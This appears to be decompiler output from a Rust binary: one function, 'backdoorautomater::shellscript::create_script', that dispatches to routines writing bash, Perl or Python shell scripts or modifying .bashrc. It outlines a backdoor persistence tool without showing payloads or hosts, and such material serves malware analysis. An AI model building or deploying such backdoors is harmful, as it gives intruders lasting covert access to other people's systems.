long long backdoorautomater::shellscript::create_script(unsigned long long a0, struct_0 *a1, struct_1 *a2, struct_0 *a3, unsigned int a4)
{
    struct_0 *v0;  // [bp-0xf0]
    unsigned long long v1;  // [bp-0xe8]
    int v2;  // [bp-0xe8]
    int v3;  // [bp-0xe8]
    int v4;  // [bp-0xe8]
    int v5;  // [bp-0xe8]
    unsigned long long v6;  // [bp-0xe0]
    char *v7;  // [bp-0xd8], Other Possible Types: unsigned long, unsigned long long
    int v8;  // [bp-0xd0], Other Possible Types: unsigned long long
    void* v9;  // [bp-0xc8]
    unsigned long v10;  // [bp-0xc0]
    char *v11;  // [bp-0xb8], Other Possible Types: int
    unsigned long long v12;  // [bp-0xb0]
    unsigned long long v13;  // [bp-0xa8], Other Possible Types: unsigned long
    int v14;  // [bp-0x98], Other Possible Types: char
    unsigned long long v15;  // [bp-0x88]
    int v16;  // [bp-0x78]
    char *v17;  // [bp-0x78]
    unsigned long v18;  // [bp-0x68]
    int v19;  // [bp-0x60], Other Possible Types: char
    unsigned long long v20;  // [bp-0x50]
    char v21;  // [bp-0x48]
    unsigned int v23;  // eax
    unsigned long v24;  // rbp
    unsigned long long v25;  // rax
    char v26;  // bl
    unsigned long long v28;  // rax

    *((long long *)&v2) = *((long long *)&a2->padding_1[7]);
    v6 = a2->field_10 + *((long long *)&a2->padding_1[7]);
    v23 = (unsigned long long)v2.next_back();
    if (v23 != 0x110000 && v23 != 47)
        a2.push();
    v7 = a2->field_10;
    *((int128_t *)&v5) = *((int128_t *)&a2->field_0);
    *((uint128_t *)&v8) = a3->field_0;
    v10 = a3->field_10;
    alloc::str::join_generic_copy(&(char)v11, &(unsigned long long)v2, 2, 1, 0);
    v15 = v13;
    memcpy(&v14, &(char)v11, 16);
    ::0x45dc50::core::ptr::drop_in_place<[alloc::string::String; 2]>(&(unsigned long long)v2);
    v21.clone(a1);
    v19.clone(&v14);
    v24 = a4;
    if ((char)v24 == 3)
    {
        v18 = a1->field_10;
        *((uint128_t *)&v16) = a1->field_0;
        v13 = v0->field_10;
        *((uint128_t *)&v11) = v0->field_0;
        v7 = v15;
        v4 = v14;
        v25 = backdoorautomater::shellscript::write_shell_bash(&v16, &(char)v11, &(unsigned long long)v2);
LABEL_45f081:
        backdoorautomater::sanitizer::sanitize_return_fn(v25);
        v26 = 1;
    }
    else if ((unsigned int)v24 == 2)
    {
        v18 = a1->field_10;
        *((uint128_t *)&v16) = a1->field_0;
        v13 = v0->field_10;
        *((uint128_t *)&v11) = v0->field_0;
        v7 = v15;
        v3 = v14;
        v25 = backdoorautomater::shellscript::write_shell_perl(&v16, &(char)v11, &(unsigned long long)v2);
        goto LABEL_45f081;
    }
    else if ((unsigned int)v24 == 1)
    {
        v18 = a1->field_10;
        *((uint128_t *)&v16) = a1->field_0;
        v13 = v0->field_10;
        *((uint128_t *)&v11) = v0->field_0;
        v7 = v15;
        v2 = v14;
        v25 = backdoorautomater::shellscript::write_shell_pyfile(&v16, &(char)v11, &(unsigned long long)v2);
        goto LABEL_45f081;
    }
    v7 = v20;
    v2 = v19;
    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::shellscript::modify_bashrc(&(unsigned long long)v2, v24 & 4294967295));
    v1 = &g_62a7e8;
    v6 = 1;
    v7 = 8;
    *((uint128_t *)&v8) = 0;
    std::io::stdio::_print(&v1);
    v17 = &v21;
    v11 = &v17;
    v12 = <&T as core::fmt::Display>::fmt;
    v1 = &g_62a7f8;
    v6 = 2;
    v9 = 0;
    v7 = &v11;
    v8 = 1;
    std::io::stdio::_print(&v1);
    v28 = ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v21);
    if (v26)
        return v28;
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v14);
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(a1);
    return ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(a0);
}
